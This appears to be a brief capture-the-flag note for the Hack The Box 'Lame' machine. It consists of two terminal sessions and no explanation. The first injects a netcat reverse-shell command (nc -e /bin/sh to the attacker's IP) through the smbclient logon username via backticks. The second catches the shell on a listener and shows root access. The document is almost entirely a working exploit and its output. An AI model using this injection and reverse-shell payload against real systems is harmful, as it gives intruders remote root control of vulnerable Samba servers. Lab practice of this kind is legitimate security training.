# SMB

__Netcat reverse shell__

T1
```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ smbclient \\\\10.10.10.3\\tmp --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
smb: \> logon "/=`nohup nc -nv 10.10.14.36 4444 -e /bin/sh`"
Password: 
```
T2
```console
kali@kali:~/Desktop/repos/ctf/hack-the-box/lame$ nc -lvp 4444
listening on [any] 4444 ...
10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.3] 44881
whoami
root
```